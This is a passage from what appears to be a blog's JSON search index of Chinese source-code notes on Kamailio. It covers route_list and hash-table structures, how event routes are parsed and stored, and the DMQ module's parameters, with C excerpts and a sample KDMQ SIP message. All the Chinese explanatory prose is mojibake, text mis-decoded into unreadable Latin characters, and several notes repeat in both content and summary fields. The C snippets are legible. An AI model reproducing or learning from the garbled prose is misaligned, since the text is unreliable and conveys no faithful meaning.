allocated memory chunk */ memset(\u0026amp;tmp[rt-\u0026gt;entries], 0, rt-\u0026gt;entries * sizeof(struct action *)); rt-\u0026gt;rlist = tmp; rt-\u0026gt;entries *= 2; } if(rt-\u0026gt;idx \u0026lt; rt-\u0026gt;entries) { ret = rt-\u0026gt;idx; rt-\u0026gt;idx++; } end: return ret; } str_hash_table æˆ‘ä»¬å¯¹hash_tableçš„æ•°æ®æ¨¡å‹è¿›è¡Œç®€åŒ–ï¼Œå®ƒå…¶å®å°±æ˜¯ä¸€hashè¡¨ï¼Œkeyæ˜¯è·¯ç”±çš„åï¼Œå€¼æ˜¯ä¸€ä¸ªæ­£æ•°ï¼Œæ­£æ•°ä»£è¡¨äº†è·¯ç”±æ‰§è¡Œå•å…ƒçš„ç´¢å¼•ä½ç½®ã€‚\nå¦‚æœæˆ‘ä»¬ç”¨jså¯¹route_listæ¥è¡¨ç¤º\ndispatcher:dst-downå¯¹åº”çš„æ˜¯ç´¢å¼•0 ç´¢å¼•0åœ¨rlisté‡Œå¯¹åº”çš„æ˜¯func1 dispatcher:dst-downäº‹ä»¶å‘ç”Ÿåï¼Œè°ƒç”¨func1 let rlist = [func1, func2, func3] let names = { \u0026#39;dispatcher:dst-down\u0026#39;: 0, \u0026#39;rtpengine:dtmf-event\u0026#39;: 1 } å…¶å®è¿™é‡Œå®Œå…¨å¯ä»¥ä¸ç”¨æ•°ç»„ï¼Œå¦‚æœåœ¨jsé‡Œ, å¯ä»¥ç›´æ¥ç”¨å‡½æ•°ä½œä¸ºhashçš„key\nlet names = { \u0026#39;dispatcher:dst-down\u0026#39;: func1, \u0026#39;rtpengine:dtmf-event\u0026#39;: func2 } action // src/core/route_struct.h struct action { int cline; char *cfile; char *rname; enum action_type type; /* forward, drop, log, send ...*/ int count; struct action *next; action_u_t val[MAX_ACTIONS]; }; str_hash_table struct str_hash_table { struct str_hash_head *table; int size; }; struct str_hash_head { struct str_hash_entry *next; struct str_hash_entry *prev; }; struct str_hash_entry { struct str_hash_entry *next; struct str_hash_entry *prev; str key; unsigned int flags; union { void *p; char *s; int n; char data[sizeof(void *)]; } u; }; åœ¨src/core/route.cä¸­å®šä¹‰å¦‚ä¸‹å‡ ä¸ªå˜é‡ï¼Œåˆ†åˆ«ç®¡ç†ç€6é’Ÿä¸åŒçš„è·¯ç”±ã€‚\n// src/core/route.c /* main routing script table */ struct route_list main_rt; struct route_list onreply_rt; struct route_list failure_rt; struct route_list branch_rt; struct route_list onsend_rt; struct route_list event_rt; ","permalink":"https://wdd.js.org/kamailio/route-list-action/","summary":"[[TOC]]\nroute_list route.hå®šä¹‰äº†å‡ ä¸ªå‡½æ•°åˆ†åˆ«ç”¨æ¥è·å–ã€æŸ¥æ‰¾ã€æ–°å¢route\n// src/core/route.h int route_get(struct route_list *rt, char *name); int route_lookup(struct route_list *rt, char *name); void push(struct action *a, struct action **head); struct route_list { struct action **rlist; int idx;\t/* first empty entry */ int entries;\t/* total number of entries */ struct str_hash_table names; /* name to route index mappings */ }; rlist æˆ‘ä»¬å¯¹route_listæ•°æ®æ¨¡å‹è¿›è¡Œç®€åŒ–:\nrlistæ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„ä¸€ç»´æ•°ç»„ï¼Œé€šè¿‡ç´¢å¼•æ¥è®¿é—®å¯¹åº”çš„å€¼ã€‚å¦‚æœæ•°ç»„çš„ç©ºé—´ä¸è¶³ï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªä¸¤å€å¤§çš„ç©ºæ•°æ®ï¼Œç„¶åå…ˆæŠŠåŸå§‹æ•°æ®å¤åˆ¶è¿‡å»ã€‚è¿™ç§å¤åˆ¶æ–¹å¼ä¿æŒçš„åŸå§‹æ•°æ®çš„ç´¢å¼•ä½ç½®ã€‚æœ‰ç‚¹åƒgolangçš„åˆ‡ç‰‡æ‰©å®¹æœºåˆ¶ã€‚\nè¿™é‡Œæœ€ä¸ºé‡è¦çš„å°±æ˜¯ä¿æŒæ•°ç»„å…ƒç´ çš„ç´¢å¼•ä½ç½®åœ¨æ‰©å®¹åä¸å˜ã€‚\nstatic inline int route_new_list(struct route_list *rt) { int ret; struct action **tmp; ret = -1; if(rt-\u0026gt;idx \u0026gt;= rt-\u0026gt;entries) { // ä¸¤å€æ‰©å®¹ tmp = pkg_realloc(rt-\u0026gt;rlist, 2 * rt-\u0026gt;entries * sizeof(struct action *)); if(tmp == 0) { LM_CRIT(\u0026#34;out of memory\\n\u0026#34;); goto end; } /* init the newly allocated memory chunk */ memset(\u0026amp;tmp[rt-\u0026gt;entries], 0, rt-\u0026gt;entries * sizeof(struct action *)); rt-\u0026gt;rlist = tmp; rt-\u0026gt;entries *= 2; } if(rt-\u0026gt;idx \u0026lt; rt-\u0026gt;entries) { ret = rt-\u0026gt;idx; rt-\u0026gt;idx++; } end: return ret; } str_hash_table æˆ‘ä»¬å¯¹hash_tableçš„æ•°æ®æ¨¡å‹è¿›è¡Œç®€åŒ–ï¼Œå®ƒå…¶å®å°±æ˜¯ä¸€hashè¡¨ï¼Œkeyæ˜¯è·¯ç”±çš„åï¼Œå€¼æ˜¯ä¸€ä¸ªæ­£æ•°ï¼Œæ­£æ•°ä»£è¡¨äº†è·¯ç”±æ‰§è¡Œå•å…ƒçš„ç´¢å¼•ä½ç½®ã€‚","title":"æºç ç¬”è®° - è‡ªå®šä¹‰äº‹ä»¶è·¯ç”±(ä¸­)"},{"content":"[[TOC]]\näº‹ä»¶è·¯ç”±ç®€ä»‹ åœ¨æŸäº›æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€äº›æ¨¡å—è‡ªå®šä¹‰çš„äº‹ä»¶è·¯ç”±ã€‚\nä¾‹å¦‚dispatcheræ¨¡å—ï¼Œæˆ–è€…rtpengineæ¨¡å—ã€‚\nevent_route[dispatcher:dst-down] { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Destination down: $rm $ru ($du)\\n\u0026#34;); } event_route[rtpengine:dtmf-event] { xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;callid: $avp(dtmf_event_callid)\\n\u0026#34;); xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;source_tag: $avp(dtmf_event_source_tag)\\n\u0026#34;); xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;timestamp: $avp(dtmf_event_timestamp)\\n\u0026#34;); xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;dtmf: $avp(dtmf_event)\\n\u0026#34;); } disapcheræ¨¡å— åœ¨dispatch.cæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°å¦‚ä¸‹ä»£ç \nif(!ds_skip_dst(old_state) \u0026amp;\u0026amp; ds_skip_dst(idx-\u0026gt;dlist[i].flags)) { ds_run_route(msg, address, \u0026#34;dispatcher:dst-down\u0026#34;, rctx); } else { if(ds_skip_dst(old_state) \u0026amp;\u0026amp; !ds_skip_dst(idx-\u0026gt;dlist[i].flags)) ds_run_route(msg, address, \u0026#34;dispatcher:dst-up\u0026#34;, rctx); } ds_run_routeè¿˜æ˜¯å®šä¹‰åœ¨dispatch.cæ–‡ä»¶ä¸­ï¼Œ\nstatic void ds_run_route(sip_msg_t *msg, str *uri, char *route, ds_rctx_t *rctx) æ¥ç€åˆä¸€ä¸ªé‡è¦è°ƒç”¨ã€‚ è¿™é‡Œä¼¼ä¹åœ¨æŸ¥æ‰¾è·¯ç”±ã€‚\nrouteè¿™ä¸ªå‚æ•°å…¶å®å°±æ˜¯dispatcher:dst-downï¼Œ æˆ–è€… dispatcher:dst-upï¼Œ\né‚£ä¹ˆevent_rtåˆæ˜¯ä»€ä¹ˆé¬¼å‘¢ï¼Ÿ\nrt = route_lookup(\u0026amp;event_rt, route); event_rtæ˜¯ä¸€ä¸ªroute_listçš„ç»“æ„ä½“\n// route.c struct route_list event_rt; route_listçš„ç»“æ„å¦‚ä¸‹ï¼Œé‡ç‚¹æ˜¯è¿™ä¸ªstr_hash_tableè¿™ä¸ªå­—æ®µï¼Œå®ƒä¼¼ä¹æ˜¯ä¸€ä¸ªhash\nstruct route_list { struct action **rlist; int idx;\t/* first empty entry */ int entries;\t/* total number of entries */ struct str_hash_table names; /* name to route index mappings */ }; str_hash_tableçš„ç»“æ„å¦‚ä¸‹ï¼š\nstruct str_hash_table { struct str_hash_head *table; int size; }; struct str_hash_head { struct str_hash_entry *next; struct str_hash_entry *prev; }; struct str_hash_entry { struct str_hash_entry *next; struct str_hash_entry *prev; str key; unsigned int flags; union { void *p; char *s; int n; char data[sizeof(void *)]; } u; }; int route_lookup(struct route_list *rt, char *name) { int len; struct str_hash_entry *e; len = strlen(name); /* check if exists and non empty*/ e = str_hash_get(\u0026amp;rt-\u0026gt;names, name, len); if(e) { return e-\u0026gt;u.n; } else { return -1; } } ä¸Šé¢ä»‹ç»äº†ä¸€å¤§å †ï¼Œæˆ‘è‡ªå·±éƒ½æœ‰ç‚¹æ™•äº†ã€‚\nä½ ç»™æˆ‘ä»‹ç»äº†äº‹ä»¶è·¯ç”±æ˜¯æ€ä¹ˆä¸€å±‚ä¸€å±‚è°ƒç”¨çš„ï¼Œ\né‚£æˆ‘è¯·é—®ä½ ï¼Œ**è¿™ä¸ªäº‹ä»¶è·¯ç”±æ˜¯æ€ä¹ˆå®‰æ’ä»£ç é‡Œçš„ï¼Ÿ**äº‹ä»¶è·¯ç”±çš„é€»è¾‘åœ¨è„šæœ¬é‡Œï¼Œè€Œå¹¶ä¸æ˜¯å¯ä»¥æ˜ å°„æˆæ¨¡å—çš„æŸä¸ªå‡½æ•°çš„ï¼Ÿ\nè¦å›ç­”ä¸Šé¢ä¸Šé¢çš„é—®é¢˜ï¼Œå°±å¿…é¡»è¦ç†è§£yyparse\nyyparse è¯´å®åœ¨çš„æˆ‘ä¹Ÿä¸å¤ªæ‡‚è¿™ä¸ªä¸Šå¤ç¥å™¨ï¼Œæˆ‘åªæ˜¯ç®€å•äº†è§£å®ƒçš„åŠŸèƒ½ï¼Œå°±æ˜¯æŠŠè¾“å…¥ä¸€äº›å®šåˆ¶è„šæœ¬è¯­è¨€ï¼Œç„¶åè¾“å‡ºcè¯­è¨€çš„å‡½æ•°è°ƒç”¨ã€‚æœ‰ç‚¹ç±»ä¼¼ç¼–è¯‘å™¨çš„æ¦‚å¿µã€‚\nevent_routeçš„å…³é”®å­—æ˜¯\nROUTE_EVENT event_route | {rt=EVENT_ROUTE;} event_route_stm ä¸‹é¢å°±å¼€å§‹è¿›å…¥ççŒœæ¨¡å¼ï¼ŒğŸ˜‚\n// cfg.y // ä»¥ä¸‹æ³¨é‡Šçº¯å±ççŒœï¼Œå¦‚æœæ­£ç¡®ï¼Œå°±æ˜¯å‡‘å·§ï¼›å¦‚æœé”™è¯¯ï¼Œçº¯å±æ­£å¸¸ï¼› event_route_stm: event_route_main LBRACK EVENT_RT_NAME RBRACK LBRACE actions RBRACE { if (!shm_initialized() \u0026amp;\u0026amp; init_shm()\u0026lt;0) { yyerror(\u0026#34;Can\u0026#39;t initialize shared memory\u0026#34;); YYABORT; } // $3, åœ¨è¿™é‡Œä»£æŒ‡EVENT_RT_NAMEï¼Œ å°±æ˜¯äº‹ä»¶è·¯ç”±çš„åç§° // è¿™é‡Œå…¶å®å°±æ˜¯æ ¹æ®åç§°æŸ¥è¯¢è·¯ç”±çš„åç§° i_tmp=route_get(\u0026amp;event_rt, $3); // -1å°±æ˜¯å†…éƒ¨é”™è¯¯ if (i_tmp==-1){ yyerror(\u0026#34;internal error\u0026#34;); YYABORT; } // æ­£å€¼å°±æ˜¯é‡å¤äº† if (event_rt.rlist[i_tmp]){ yyerror(\u0026#34;duplicate route\u0026#34;); YYABORT; } // æœ€åå°±æ˜¯æ­£å¸¸ï¼Œç„¶åæŠŠ$6, ä¹Ÿå°±æ˜¯actionæ”¾åˆ°è·¯ç”±é‡Œé¢ push($6, \u0026amp;event_rt.rlist[i_tmp]); } route_getå°±æ˜¯æ ¹æ®äº‹ä»¶è·¯ç”±çš„åç§°ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ”¾ç½®äº‹ä»¶è·¯ç”±çš„åº§ä½å·\n/* * if the \u0026#34;name\u0026#34; route already exists, return its index, else * create a new empty route * return route index in rt-\u0026gt;rlist or -1 on error */ int route_get(struct route_list *rt, char *name) { int len; struct str_hash_entry *e; int i; len = strlen(name); /* check if exists and non empty*/ e = str_hash_get(\u0026amp;rt-\u0026gt;names, name, len); if(e) { i = e-\u0026gt;u.n; } else { i = route_new_list(rt); if(i == -1) goto error; if(route_add(rt, name, i) \u0026lt; 0) { goto error; } } return i; error: return -1; } ç„¶åæˆ‘ä»¬æ‹¿ç€åº§ä½å·ï¼ŒæŠŠäº‹ä»¶è·¯ç”±å®‰ç½®ä¸Š\n/* adds an action list to head; a must be null terminated (last a-\u0026gt;next=0))*/ void push(struct action *a, struct action **head) { struct action *t; if(*head == 0) { *head = a; return; } for(t = *head; t-\u0026gt;next; t = t-\u0026gt;next) ; t-\u0026gt;next = a; } è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å›æ¥æˆ‘ä»¬è‡ªå·±æå‡ºçš„é—®é¢˜ï¼šäº‹ä»¶è·¯ç”±çš„å†…å®¹æ˜¯å¦‚ä½•è¢«å®‰æ’è¿›è·¯ç”±æ¨¡å—çš„ã€‚\n","permalink":"https://wdd.js.org/kamailio/customer-event-route/","summary":"[[TOC]]\näº‹ä»¶è·¯ç”±ç®€ä»‹ åœ¨æŸäº›æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€äº›æ¨¡å—è‡ªå®šä¹‰çš„äº‹ä»¶è·¯ç”±ã€‚\nä¾‹å¦‚dispatcheræ¨¡å—ï¼Œæˆ–è€…rtpengineæ¨¡å—ã€‚\nevent_route[dispatcher:dst-down] { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Destination down: $rm $ru ($du)\\n\u0026#34;); } event_route[rtpengine:dtmf-event] { xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;callid: $avp(dtmf_event_callid)\\n\u0026#34;); xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;source_tag: $avp(dtmf_event_source_tag)\\n\u0026#34;); xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;timestamp: $avp(dtmf_event_timestamp)\\n\u0026#34;); xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;dtmf: $avp(dtmf_event)\\n\u0026#34;); } disapcheræ¨¡å— åœ¨dispatch.cæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°å¦‚ä¸‹ä»£ç \nif(!ds_skip_dst(old_state) \u0026amp;\u0026amp; ds_skip_dst(idx-\u0026gt;dlist[i].flags)) { ds_run_route(msg, address, \u0026#34;dispatcher:dst-down\u0026#34;, rctx); } else { if(ds_skip_dst(old_state) \u0026amp;\u0026amp; !ds_skip_dst(idx-\u0026gt;dlist[i].flags)) ds_run_route(msg, address, \u0026#34;dispatcher:dst-up\u0026#34;, rctx); } ds_run_routeè¿˜æ˜¯å®šä¹‰åœ¨dispatch.cæ–‡ä»¶ä¸­ï¼Œ\nstatic void ds_run_route(sip_msg_t *msg, str *uri, char *route, ds_rctx_t *rctx) æ¥ç€åˆä¸€ä¸ªé‡è¦è°ƒç”¨ã€‚ è¿™é‡Œä¼¼ä¹åœ¨æŸ¥æ‰¾è·¯ç”±ã€‚\nrouteè¿™ä¸ªå‚æ•°å…¶å®å°±æ˜¯dispatcher:dst-downï¼Œ æˆ–è€… dispatcher:dst-upï¼Œ\né‚£ä¹ˆevent_rtåˆæ˜¯ä»€ä¹ˆé¬¼å‘¢ï¼Ÿ\nrt = route_lookup(\u0026amp;event_rt, route); event_rtæ˜¯ä¸€ä¸ªroute_listçš„ç»“æ„ä½“","title":"æºç ç¬”è®° - è‡ªå®šä¹‰äº‹ä»¶è·¯ç”±(ä¸Š)"},{"content":"èƒŒæ™¯ å¤šä¸ªSIPæ³¨å†ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œå¦‚ä½•åŒæ­¥åˆ†æœºçš„æ³¨å†Œä¿¡æ¯å‘¢ï¼Ÿ\nç®€å•çš„æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨å…±äº«æ•°æ®åº“çš„æ–¹å¼åŒæ­¥æ³¨å†Œä¿¡æ¯ï¼Œè¿™ä¸ªæ–¹æ¡ˆå®ç°èµ·æ¥ç®€å•ï¼Œä½†æ˜¯åˆ†æœºçš„æ³¨å†Œä¿¡æ¯æœ¬èº«å°±æ˜¯ä¸ªéœ€è¦é¢‘ç¹å¢åˆ æ”¹æŸ¥çš„ï¼Œæ•°æ®åº“å¾ˆå¯èƒ½åœ¨å¤§é‡æ³¨å†Œåˆ†æœºçš„å‹åŠ›ä¸‹ï¼Œæˆä¸ºæ€§èƒ½çš„ç“¶é¢ˆã€‚\né™¤äº†æ•°æ®åº“ä¹‹å¤–ï¼ŒOpenSIPSå’Œkamailioåˆ†åˆ«æä¾›äº†ä¸åŒçš„æ–¹æ¡ˆã€‚\nOpenSIPSæä¾›çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨clusteræ¨¡å—ï¼Œclusteræ¨¡å—åœ¨å¤šä¸ªå®ä¾‹ä¹‹é—´åŒæ­¥åˆ†æœºçš„æ³¨å†Œä¿¡æ¯ï¼Œæ³¨å†Œä¿¡æ¯çš„æ ¼å¼æ˜¯OpenSIPSè‡ªå®šä¹‰çš„æ ¼å¼ã€‚ Kamailioçš„æ–¹æ¡ˆæ˜¯DMQæ¨¡å—ï¼Œ DMQå¬èµ·æ¥é«˜å¤§ä¸Šï¼Œæ”¾ä½›æ˜¯ä¾èµ–å¤–éƒ¨çš„ä¸€ä¸ªæœåŠ¡ã€‚ ä½†å®ƒå…¶å®å°±æ˜¯æ‰©å±•SIPæ¶ˆæ¯ï¼Œé€šè¿‡SIPæ¶ˆæ¯æ¥å¹¿æ’­åˆ†æœºçš„æ³¨å†Œä¿¡æ¯ã€‚\nKDMQ sip:notification_peer@192.168.40.15:5090 SIP/2.0 Via: SIP/2.0/UDP 192.168.40.15;branch=z9hG4bK55e5.423d95110000 To: \u0026lt;sip:notification_peer@192.168.40.15:5090\u0026gt; From: \u0026lt;sip:notification_peer@192.168.40.15:5060\u0026gt;;tag=2cdb7a33a7f21abb98fd3a44968e3ffd-5b01 CSeq: 10 KDMQ Call-ID: 1fe138e07b5d0a7a-50419@192.168.40.15 Content-Length: 116 User-Agent: kamailio (4.3.0 (x86_64/linneaus)) Max-Forwards: 1 Content-Type: text/plain sip:192.168.40.16:5060;status=active sip:192.168.40.15:5060;status=disabled sip:192.168.40.17:5060;status=active æºç åˆ†æ è¯¥æ¨¡å—ä¸€å…±æš´éœ²äº†8ä¸ªå‚æ•°ï¼Œå…¶ä¸­7ä¸ªå‚æ•°éƒ½æ˜¯ç®€å•ç±»å‹ï¼ŒINTå’ŒSTRï¼Œå°±ç›´æ¥å–å¯¹åº”å˜é‡çš„åœ°å€å°±å¯ä»¥äº†ã€‚\nå…¶ä¸­notification_addresså‚æ•°æ˜¯ç”¨æ¥é…ç½®é›†ç¾¤ä¸­å…¶ä»–èŠ‚ç‚¹çš„é€šä¿¡åœ°å€çš„ï¼Œå› ä¸ºè¦é…ç½®å¤šæ¬¡ï¼Œæ‰€ä»¥éœ€è¦ç”¨ä¸€ä¸ªå‡½æ•°æ¥è§£æã€‚\n// dmq.c static param_export_t params[] = { {\u0026#34;num_workers\u0026#34;, PARAM_INT, \u0026amp;dmq_num_workers}, {\u0026#34;ping_interval\u0026#34;, PARAM_INT, \u0026amp;dmq_ping_interval}, {\u0026#34;server_address\u0026#34;, PARAM_STR, \u0026amp;dmq_server_address}, {\u0026#34;server_socket\u0026#34;, PARAM_STR, \u0026amp;dmq_server_socket}, {\u0026#34;notification_address\u0026#34;, PARAM_STR|PARAM_USE_FUNC, dmq_add_notification_address}, {\u0026#34;notification_channel\u0026#34;, PARAM_STR, \u0026amp;dmq_notification_channel}, {\u0026#34;multi_notify\u0026#34;, PARAM_INT, \u0026amp;dmq_multi_notify}, {\u0026#34;worker_usleep\u0026#34;, PARAM_INT, \u0026amp;dmq_worker_usleep}, {0, 0, 0} }; è¿™äº›å‚æ•°éƒ½æ²¡æœ‰åŠ ä¸Šstaticå…³é”®è¯ï¼Œä¸»è¦ç›®çš„ä¸ºäº†åœ¨dmqæ¨¡å—çš„å…¶ä»–cæ–‡ä»¶èƒ½ä½¿ç”¨ã€‚\n// dmq.c int dmq_num_workers = DEFAULT_NUM_WORKERS; int dmq_worker_usleep = 0; str dmq_server_address = {0, 0}; str dmq_server_socket = {0, 0}; str dmq_notification_channel = str_init(\u0026#34;notification_peer\u0026#34;); int dmq_multi_notify = 0; int dmq_ping_interval = 60; str_list_t *dmq_notification_address_list = NULL; dmq_add_notification_address è¿™ä¸ªå‡½æ•°æ˜¯åœ¨è„šæœ¬è§£æé˜¶æ®µæ‰§è¡Œï¼Œæ¯æ¬¡é…ç½®ä¸€ä¸ªnotification_addressï¼Œå®ƒå°±ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚\næœ€ç»ˆçš„ç›®çš„å°±æ˜¯ç»„è£…dmq_notification_address_listè¿™ä¸ªé“¾è¡¨ç»“æ„ï¼Œå®ƒé‡Œé¢å­˜çš„å°±æ˜¯é›†ç¾¤é‡Œå…¶ä»–èŠ‚ç‚¹çš„SIPé€šä¿¡åœ°å€ã€‚\nstatic int dmq_add_notification_address(modparam_t type, void *val) { str tmp_str; int total_list = 0; /* not used */ if(val == NULL) { LM_ERR(\u0026#34;invalid notification address parameter value\\n\u0026#34;); return -1; } tmp_str.s = ((str *)val)-\u0026gt;s; tmp_str.len = ((str *)val)-\u0026gt;len; /* è¿™ä¸ªå‚æ•°çš„æ ¼å¼æ˜¯ä¸ªSIP URL å¦‚ï¼š sip:10.0.0.21:5060 sip:10.0.0.21:5061;transport=tls æ‰€ä»¥éœ€è¦åšä¸€æ¬¡è§£æï¼Œå…¶å®ä¹Ÿæ˜¯éªŒè¯æ•°æ®çš„æ ¼å¼æ˜¯å¦æ­£ç¡® dmq_notification_uri æ˜¯ä¸ªstaticç±»å‹çš„å€¼ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨ */ if(parse_uri(tmp_str.s, tmp_str.len, \u0026amp;dmq_notification_uri) \u0026lt; 0) { LM_ERR(\u0026#34;could not parse notification address\\n\u0026#34;); return -1; } /* initial allocation */ if(dmq_notification_address_list == NULL) { /* åˆæ¬¡åˆ†é…ï¼Œ ç”³è¯·ä¸€å—å†…å®¹ï¼Œç”¨æ¥å­˜å‚¨ç¬¬ä¸€ä¸ªå…ƒç´  */ dmq_notification_address_list = pkg_malloc(sizeof(str_list_t)); // ç”³è¯·å¤±è´¥ if(dmq_notification_address_list == NULL) { PKG_MEM_ERROR; return -1; } // è£…è½½åˆ—è¡¨çš„ç¬¬ä¸€é¡¹ dmq_tmp_list = dmq_notification_address_list; dmq_tmp_list-\u0026gt;s = tmp_str; dmq_tmp_list-\u0026gt;next = NULL; LM_DBG(\u0026#34;Created list and added new notification address to the list \u0026#34; \u0026#34;%.*s\\n\u0026#34;, dmq_tmp_list-\u0026gt;s.len, dmq_tmp_list-\u0026gt;s.s); } else { // æ€è€ƒè¿™é‡Œä¼ å…¥çš„æ˜¯åŒå±‚æŒ‡é’ˆï¼Œè€Œä¸æ˜¯æŒ‡é’ˆï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ // åœ¨å‡½æ•°å‚æ•°ä¸­ä½¿ç”¨æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆï¼Œå¯ä»¥ä¿®æ”¹æŒ‡é’ˆæœ¬èº«çš„å€¼ // append_str_list å°±è¦ä¿®æ”¹lastæŒ‡é’ˆçš„æŒ‡å‘ // notification_address æ¯æ¬¡è¢«è®¾ç½®ä¸€æ¬¡ï¼Œé“¾è¡¨å°±è¦å¢åŠ ä¸€é¡¹ï¼Œdmq_tmp_listå°±è¦å‘åç§»åŠ¨ä¸€ä½ dmq_tmp_list = append_str_list( tmp_str.s, tmp_str.len, \u0026amp;dmq_tmp_list, \u0026amp;total_list); if(dmq_tmp_list == NULL) { LM_ERR(\u0026#34;could not append to list\\n\u0026#34;); return -1; } LM_DBG(\u0026#34;added new notification address to the list %.*s\\n\u0026#34;, dmq_tmp_list-\u0026gt;s.len, dmq_tmp_list-\u0026gt;s.s); } return 0; } ","permalink":"https://wdd.js.org/kamailio/dmq-note/","summary":"èƒŒæ™¯ å¤šä¸ªSIPæ³¨å†ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œå¦‚ä½•åŒæ­¥åˆ†æœºçš„æ³¨å†Œä¿¡æ¯å‘¢ï¼Ÿ\nç®€å•çš„æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨å…±äº«æ•°æ®åº“çš„æ–¹å¼åŒæ­¥æ³¨å†Œä¿¡æ¯ï¼Œè¿™ä¸ªæ–¹æ¡ˆå®ç°èµ·æ¥ç®€å•ï¼Œä½†æ˜¯åˆ†æœºçš„æ³¨å†Œä¿¡æ¯æœ¬èº«å°±æ˜¯ä¸ªéœ€è¦é¢‘ç¹å¢åˆ æ”¹æŸ¥çš„ï¼Œæ•°æ®åº“å¾ˆå¯èƒ½åœ¨å¤§é‡æ³¨å†Œåˆ†æœºçš„å‹åŠ›ä¸‹ï¼Œæˆä¸ºæ€§èƒ½çš„ç“¶é¢ˆã€‚\né™¤äº†æ•°æ®åº“ä¹‹å¤–ï¼ŒOpenSIPSå’Œkamailioåˆ†åˆ«æä¾›äº†ä¸åŒçš„æ–¹æ¡ˆã€‚\nOpenSIPSæä¾›çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨clusteræ¨¡å—ï¼Œclusteræ¨¡å—åœ¨å¤šä¸ªå®ä¾‹ä¹‹é—´åŒæ­¥åˆ†æœºçš„æ³¨å†Œä¿¡æ¯ï¼Œæ³¨å†Œä¿¡æ¯çš„æ ¼å¼æ˜¯OpenSIPSè‡ªå®šä¹‰çš„æ ¼å¼ã€‚ Kamailioçš„æ–¹æ¡ˆæ˜¯DMQæ¨¡å—ï¼Œ DMQå¬èµ·æ¥é«˜å¤§ä¸Šï¼Œæ”¾ä½›æ˜¯ä¾èµ–å¤–éƒ¨çš„ä¸€ä¸ªæœåŠ¡ã€‚ ä½†å®ƒå…¶å®å°±æ˜¯æ‰©å±•SIPæ¶ˆæ¯ï¼Œé€šè¿‡SIPæ¶ˆæ¯æ¥å¹¿æ’­åˆ†æœºçš„æ³¨å†Œä¿¡æ¯ã€‚\nKDMQ sip:notification_peer@192.168.40.15:5090 SIP/2.0 Via: SIP/2.0/UDP 192.168.40.15;branch=z9hG4bK55e5.423d95110000 To: \u0026lt;sip:notification_peer@192.168.40.15:5090\u0026gt; From: \u0026lt;sip:notification_peer@192.168.40.15:5060\u0026gt;;tag=2cdb7a33a7f21abb98fd3a44968e3ffd-5b01 CSeq: 10 KDMQ Call-ID: 1fe138e07b5d0a7a-50419@192.168.40.15 Content-Length: 116 User-Agent: kamailio (4.3.0 (x86_64/linneaus)) Max-Forwards: 1 Content-Type: text/plain sip:192.168.40.16:5060;status=active sip:192.168.40.15:5060;status=disabled sip:192.168.40.17:5060;status=active æºç åˆ†æ è¯¥æ¨¡å—ä¸€å…±æš´éœ²äº†8ä¸ªå‚æ•°ï¼Œå…¶ä¸­7ä¸ªå‚æ•°éƒ½æ˜¯ç®€å•ç±»å‹ï¼ŒINTå’ŒSTRï¼Œå°±ç›´æ¥å–å¯¹åº”å˜é‡çš„åœ°å€å°±å¯ä»¥äº†ã€‚\nå…¶ä¸­notification_addresså‚æ•°æ˜¯ç”¨æ¥é…ç½®é›†ç¾¤ä¸­å…¶ä»–èŠ‚ç‚¹çš„é€šä¿¡åœ°å€çš„ï¼Œå› ä¸ºè¦é…ç½®å¤šæ¬¡ï¼Œæ‰€ä»¥éœ€è¦ç”¨ä¸€ä¸ªå‡½æ•°æ¥è§£æã€‚\n// dmq.c static param_export_t params[] = { {\u0026#34;num_workers\u0026#34;, PARAM_INT, \u0026amp;dmq_num_workers}, {\u0026#34;ping_interval\u0026#34;, PARAM_INT, \u0026amp;dmq_ping_interval}, {\u0026#34;server_address\u0026#34;, PARAM_STR, \u0026amp;dmq_server_address}, {\u0026#34;server_socket\u0026#34;, PARAM_STR, \u0026amp;dmq_server_socket}, {\u0026#34;notification_address\u0026#34;, PARAM_STR|PARAM_USE_FUNC, dmq_add_notification_address}, {\u0026#34;notification_channel\u0026#34;, PARAM_STR, \u0026amp;dmq_notification_channel}, {\u0026#34;multi_notify\u0026#34;, PARAM_INT, \u0026amp;dmq_multi_notify}, {\u0026#34;worker_usleep\u0026#34;, PARAM_INT, \u0026amp;dmq_worker_usleep}, {0, 0, 0} }; è¿™äº›å‚æ•°éƒ½æ²¡æœ‰åŠ ä¸Šstaticå…³é”®è¯ï¼Œä¸»è¦ç›®çš„ä¸ºäº†åœ¨dmqæ¨¡å—çš„å…¶ä»–cæ–‡ä»¶èƒ½ä½¿ç”¨ã€‚","title":"DMQæ¨¡å—æºç å­¦ä¹ ç¬”è®°"},{"content":"1. è¯·æ±‚æ¶ˆæ¯å¤„ç†è¿‡ç¨‹ è¯·æ±‚å¯ä»¥\nç›´æ¥ä¸¢å¼ƒï¼Œä¸è¿”å›ä»»ä½•å“åº”ã€‚å¯¹äºæ¶æ„è¯·æ±‚ï¼ŒSIP Floodæ”»å‡»ï¼Œæœ€å¥½ä¸è¦è¿”å›ä»»ä½•å“åº”ã€‚ 